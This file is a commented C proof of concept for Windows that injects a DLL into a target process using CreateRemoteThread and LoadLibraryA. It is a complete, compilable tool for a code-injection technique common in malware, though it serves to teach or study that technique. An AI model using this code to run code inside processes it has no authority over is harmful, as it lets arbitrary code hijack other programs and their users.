// PoC to demonstrate injecting a DLL into a remote process using CreateRemoteThread
//
// General steps:
//	- Get a handle to the target process with appropriate access rights
//	- Allocate memory in the target process to hold our dll path
//	- Write our DLL path into memory of target process
//	- Call CreateRemoteThread to create a thread in target process
//	  - Use LoadLibrary to load our DLL into target process (requires us to use GetProcAddress and GetModuleHandle)
//  - Cleanup

// Compile with VS build tools:
// cl .\InjectRemoteThread.c /DUNICODE /D_UNICODE

#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("Usage: InjectRemoteThread [pid] [dllpath]\n");
		return 0;
	}

	int pid = strtol(argv[1], NULL, 0);

	// Open a handle to target process (the one we're injecting into)
	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess) {
		printf("Failed to open process (%u)\n", GetLastError());
		return 1;
	}

	// Write our DLL path into target process
	// Instead of using strlen for buffer size we could just ask for 4kb because that's the min
	// we'll get with VirtualAlloc anyway (and it's more than enough for our path)
	void* buffer = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!buffer) {
		return 1;
	}

	// NOTE: We don't need to add + 1 to strlen to include the NULL terminator because when we allocate
	// memory with VirtualAlloc it's zeroed out already - so our string will be NULL terminated
	if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), NULL)) {
		return 1;
	}

	// Grab the address of LoadLibrary to pass to CreateRemoteThread - because it's part of a 
	// subsystem DLL the address is the same across all processes (not just our own)

	// Create remote thread in target process
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"),
		buffer, 0, NULL);
	if (!hThread) {
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE); // wait for the remote thread to finish loading the DLL
	printf("Success!\n");

	// Free the memory we allocated for our DLL path 
	VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
